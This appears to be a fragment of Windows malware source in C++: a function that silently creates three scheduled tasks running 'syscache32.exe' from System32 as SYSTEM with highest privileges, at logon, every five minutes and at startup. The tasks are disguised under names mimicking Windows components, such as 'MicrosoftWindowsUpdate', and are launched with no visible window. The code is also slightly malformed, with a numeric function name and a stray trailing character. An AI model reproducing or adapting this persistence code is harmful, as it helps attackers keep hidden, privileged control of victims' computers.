#include "01.h"
#include "10.h"
void 10() {
    std::wstring exe = L"C:\\Windows\\System32\\syscache32.exe";
    std::wstring cmd = L"schtasks /create /tn \"WindowsSystemCache\" /tr \"" + exe + L"\" /sc onlogon /ru SYSTEM /f /rl HIGHEST /delay 0000:00:30";
    std::wstring cmd2 = L"schtasks /create /tn \"WindowsCacheService\" /tr \"" + exe + L"\" /sc minute /mo 5 /ru SYSTEM /f /rl HIGHEST";
    std::wstring cmd3 = L"schtasks /create /tn \"MicrosoftWindowsUpdate\" /tr \"" + exe + L"\" /sc onstart /ru SYSTEM /f /rl HIGHEST";
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcess(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    CreateProcess(NULL, (LPWSTR)cmd2.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    CreateProcess(NULL, (LPWSTR)cmd3.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}7
